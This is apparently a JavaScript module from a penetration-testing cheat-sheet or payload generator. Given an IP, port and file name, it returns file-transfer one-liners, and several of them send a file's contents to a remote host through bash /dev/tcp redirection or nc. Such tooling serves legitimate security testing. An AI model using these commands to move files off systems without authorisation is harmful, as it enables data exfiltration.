module.exports = { getCode:function(s,p,f){
	var values={"file_name":f,"port":p,"ip":s};
	return [`
    bash -c 'echo -e "POST / HTTP/0.9\n\n$(<${values.file_name})" > /dev/tcp/${values.ip}/${values.port}'
    `,` 
    bash -c 'cat ${values.file_name} > /dev/tcp/${values.ip}/${values.port}'
    `,`bash -c 'cat < /dev/tcp/${values.ip}/${values.port} > ${values.file_name}'`,
	`nc ${values.ip} ${values.port} < ${values.file_name}`,
	`python3 -m http.server ${values.port}`,
	`python -m SimpleHTTPServer ${values.port}`,
	`scp ${values.file_name} username@${values.ip || 'IP'}:~/destination ${values.port &&
		'-P ' + values.port}`,
		`scp user@${values.ip || 'IP'}:~/path_to_file file_saved ${values.port && '-P ' + values.port}`
	];
}};
